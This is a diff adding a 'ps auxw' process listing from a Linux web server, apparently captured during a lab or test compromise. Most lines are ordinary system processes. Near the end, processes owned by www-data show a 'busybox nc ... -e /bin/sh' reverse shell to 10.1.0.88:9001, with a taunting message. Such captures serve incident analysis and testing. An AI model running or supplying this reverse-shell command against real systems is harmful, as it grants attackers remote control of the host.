@@ -1,0 +1,81 @@
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.1  1.3 168896 13348 ?        Ss   11:53   0:05 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    11:53   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   11:53   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   11:53   0:00 [rcu_par_gp]
+root           5  0.0  0.0      0     0 ?        I<   11:53   0:00 [slub_flushwq]
+root           6  0.0  0.0      0     0 ?        I<   11:53   0:00 [netns]
+root           8  0.0  0.0      0     0 ?        I<   11:53   0:00 [kworker/0:0H-events_highpri]
+root          10  0.0  0.0      0     0 ?        I<   11:53   0:00 [mm_percpu_wq]
+root          11  0.0  0.0      0     0 ?        I    11:53   0:00 [rcu_tasks_kthread]
+root          12  0.0  0.0      0     0 ?        I    11:53   0:00 [rcu_tasks_rude_kthread]
+root          13  0.0  0.0      0     0 ?        I    11:53   0:00 [rcu_tasks_trace_kthread]
+root          14  0.0  0.0      0     0 ?        S    11:53   0:00 [ksoftirqd/0]
+root          15  0.0  0.0      0     0 ?        I    11:53   0:00 [rcu_preempt]
+root          16  0.0  0.0      0     0 ?        S    11:53   0:00 [migration/0]
+root          18  0.0  0.0      0     0 ?        S    11:53   0:00 [cpuhp/0]
+root          20  0.0  0.0      0     0 ?        S    11:53   0:00 [kdevtmpfs]
+root          21  0.0  0.0      0     0 ?        I<   11:53   0:00 [inet_frag_wq]
+root          22  0.0  0.0      0     0 ?        S    11:53   0:00 [kauditd]
+root          23  0.0  0.0      0     0 ?        S    11:53   0:00 [khungtaskd]
+root          24  0.0  0.0      0     0 ?        S    11:53   0:00 [oom_reaper]
+root          27  0.0  0.0      0     0 ?        I<   11:53   0:00 [writeback]
+root          28  0.0  0.0      0     0 ?        S    11:53   0:00 [kcompactd0]
+root          29  0.0  0.0      0     0 ?        SN   11:53   0:00 [ksmd]
+root          30  0.0  0.0      0     0 ?        SN   11:53   0:00 [khugepaged]
+root          31  0.0  0.0      0     0 ?        I<   11:53   0:00 [kintegrityd]
+root          32  0.0  0.0      0     0 ?        I<   11:53   0:00 [kblockd]
+root          33  0.0  0.0      0     0 ?        I<   11:53   0:00 [blkcg_punt_bio]
+root          34  0.0  0.0      0     0 ?        I<   11:53   0:00 [tpm_dev_wq]
+root          35  0.0  0.0      0     0 ?        I<   11:53   0:00 [edac-poller]
+root          36  0.0  0.0      0     0 ?        I<   11:53   0:00 [devfreq_wq]
+root          37  0.0  0.0      0     0 ?        I<   11:53   0:00 [kworker/0:1H-kblockd]
+root          38  0.0  0.0      0     0 ?        S    11:53   0:00 [kswapd0]
+root          44  0.0  0.0      0     0 ?        I<   11:53   0:00 [kthrotld]
+root          46  0.0  0.0      0     0 ?        I<   11:53   0:00 [acpi_thermal_pm]
+root          47  0.0  0.0      0     0 ?        I<   11:53   0:00 [mld]
+root          48  0.0  0.0      0     0 ?        I<   11:53   0:00 [ipv6_addrconf]
+root          53  0.0  0.0      0     0 ?        I<   11:53   0:00 [kstrp]
+root          58  0.0  0.0      0     0 ?        I<   11:53   0:00 [zswap-shrink]
+root          59  0.0  0.0      0     0 ?        I<   11:53   0:00 [kworker/u3:0]
+root         116  0.0  0.0      0     0 ?        I<   11:53   0:00 [ata_sff]
+root         117  0.0  0.0      0     0 ?        S    11:53   0:00 [scsi_eh_0]
+root         118  0.0  0.0      0     0 ?        I<   11:53   0:00 [scsi_tmf_0]
+root         119  0.0  0.0      0     0 ?        S    11:53   0:00 [scsi_eh_1]
+root         120  0.0  0.0      0     0 ?        I<   11:53   0:00 [scsi_tmf_1]
+root         123  0.0  0.0      0     0 ?        S    11:53   0:00 [scsi_eh_2]
+root         124  0.0  0.0      0     0 ?        I<   11:53   0:00 [scsi_tmf_2]
+root         161  0.0  0.0      0     0 ?        S    11:53   0:00 [jbd2/sda1-8]
+root         162  0.0  0.0      0     0 ?        I<   11:53   0:00 [ext4-rsv-conver]
+root         201  0.0  1.8  49508 18084 ?        Ss   11:53   0:00 /lib/systemd/systemd-journald
+root         227  0.0  0.5  25872  5876 ?        Ss   11:53   0:00 /lib/systemd/systemd-udevd
+systemd+     260  0.0  0.6  90056  6568 ?        Ssl  11:53   0:00 /lib/systemd/systemd-timesyncd
+root         349  0.0  0.2   6608  2508 ?        Ss   11:53   0:00 /usr/sbin/cron -f
+message+     353  0.0  0.5   9388  4960 ?        Ss   11:53   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         356  0.1  0.3  80240  3636 ?        Ssl  11:53   0:03 /usr/sbin/qemu-ga
+root         358  0.0  0.8  17024  7972 ?        Ss   11:53   0:00 /lib/systemd/systemd-logind
+root         383  0.0  0.1   5872   996 tty1     Ss+  11:53   0:00 /sbin/agetty -o -p -- \u --noclear - linux
+root         386  0.0  0.9  15548  9240 ?        Ss   11:53   0:00 sshd: /usr/sbin/sshd -D -f /etc/ssh/mgmtsshd_config [listener] 0 of 10-100 startups
+root        1860  0.0  1.0  18868 10448 ?        Ss   12:15   0:00 /lib/systemd/systemd --user
+root        1861  0.0  0.0      0     0 ?        I    12:15   0:00 [kworker/0:1-events]
+root        1862  0.0  0.2 102948  2900 ?        S    12:15   0:00 (sd-pam)
+www-data    9380  0.0  0.0   3408   168 ?        Ss   12:17   0:00 /usr/bin/htcacheclean -d 120 -p /var/cache/apache2/mod_cache_disk -l 300M -n
+root        9675  0.0  2.1 204120 21480 ?        Ss   12:18   0:00 /usr/sbin/apache2 -k start
+www-data    9676  0.0  1.6 204856 16480 ?        S    12:18   0:00 /usr/sbin/apache2 -k start
+www-data    9677  0.0  1.8 204856 18076 ?        S    12:18   0:01 /usr/sbin/apache2 -k start
+www-data    9678  0.0  1.6 204856 16544 ?        S    12:18   0:00 /usr/sbin/apache2 -k start
+www-data    9679  0.0  1.6 204856 16480 ?        S    12:18   0:00 /usr/sbin/apache2 -k start
+www-data    9680  0.0  1.6 204856 16480 ?        S    12:18   0:00 /usr/sbin/apache2 -k start
+root        9896  0.0  0.4  10180  4252 ?        Ss   12:19   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
+root        9957  0.0  0.8  15548  8268 ?        Ss   12:19   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+root       10382  0.0  0.0      0     0 ?        I    12:21   0:00 [kworker/u2:5-events_unbound]
+root       10388  0.0  1.1  18316 11684 ?        Ss   12:22   0:00 sshd: root@notty
+root       10535  0.0  0.3   5868  3600 ?        Ss   12:23   0:00 dhclient -4 -v -i -pf /run/dhclient.ens18.pid -lf /var/lib/dhcp/dhclient.ens18.leases -I -df /var/lib/dhcp/dhclient6.ens18.leases ens18
+www-data   10575  0.0  1.6 204856 16480 ?        S    12:25   0:00 /usr/sbin/apache2 -k start
+www-data   10580  0.0  1.6 204856 16480 ?        S    12:27   0:00 /usr/sbin/apache2 -k start
+root       10628  0.0  0.0      0     0 ?        I    12:36   0:00 [kworker/u2:0-events_unbound]
+root       10682  0.0  0.0      0     0 ?        I    12:39   0:00 [kworker/0:2]
+root       10687  0.0  0.0      0     0 ?        I    12:44   0:00 [kworker/u2:1]
+www-data   10702  0.0  0.0   2576   916 ?        S    12:46   0:00 sh -c echo Hello  you cuddly cat! I started a revshell to 10.1.0.88:9001;busybox nc 10.1.0.88 9001 -e "/bin/sh"
+www-data   10703  0.0  0.0   2576   888 ?        S    12:46   0:00 /bin/sh
+www-data   10704  0.0  0.4   8100  4000 ?        R    12:46   0:00 ps auxw
